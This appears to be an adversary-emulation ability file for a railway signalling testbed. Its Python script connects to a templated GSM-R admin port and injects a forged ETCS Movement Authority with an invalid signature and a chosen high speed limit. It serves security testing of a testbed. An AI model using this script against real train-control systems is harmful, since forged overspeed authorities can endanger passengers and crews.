---
id: 1a2b3c4d-5e6f-7g8h-9i0j-1k2l3m4n5o6p
name: ETCS Overspeed Attack (JSON)
description: Inject forged Movement Authority with dangerously high speed limit via GSM-R admin interface
tactic: impact
technique:
  attack_id: T0831
  name: Manipulation of Control
platforms:
  linux:
    sh:
      command: |
        python3 << 'EOF'
        import socket
        import json
        import time

        payload = {
            "type": "MA",
            "ma_id": int(time.time() * 1000) % 65536,
            "position_km": 1.0,
            "next_checkpoint_km": 10.0,
            "speed_limit": #{etcs.speed_limit},
            "message": "ATTACK_MA"
        }
        
        message = {
            "payload": payload,
            "signature": "00deadbeef"  # Invalid signature
        }
        
        line = json.dumps(message) + "\n"
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("#{etcs.gsmr_host}", #{etcs.gsmr_admin_port}))
            s.sendall(line.encode())
            s.close()
            print(f"[SUCCESS] Injected overspeed MA: {payload['speed_limit']} km/h")
        except Exception as e:
            print(f"[FAILED] {e}")
        EOF
      parsers:
        plugins.etcs_testbed.app.parsers.etcs_result:
          - source: etcs.attack_result
      cleanup: []
      payloads: []
requirements:
  - plugins.etcs_testbed.app.requirements.etcs_reachable:
      - source: etcs.gsmr_host
      - source: etcs.gsmr_admin_port
access:
  - red
